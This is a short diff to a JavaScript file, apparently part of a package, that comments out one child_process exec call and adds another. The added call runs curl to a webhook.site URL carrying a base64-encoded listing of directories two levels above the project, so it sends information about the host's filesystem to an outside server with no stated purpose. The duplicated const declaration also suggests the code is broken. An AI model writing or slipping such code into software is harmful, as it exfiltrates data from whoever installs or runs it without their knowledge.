@@ -20,7 +20,21 @@ console.log("xxxxxx");
 const { exec } = require('node:child_process')
 
 
-exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; ls | base64)' , (err, output) => {
+// // exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; ls | base64)' , (err, output) => {
+//     if (err) {
+//         console.error("could not execute command: ", err)
+//         return
+//     }
+//     // log the output received from the command
+//     console.log("Output: \n", output)
+// })
+
+console.log("xxxxxx");
+
+const { exec } = require('node:child_process')
+
+
+exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; cd ..; ls | base64)' , (err, output) => {
     if (err) {
         console.error("could not execute command: ", err)
         return
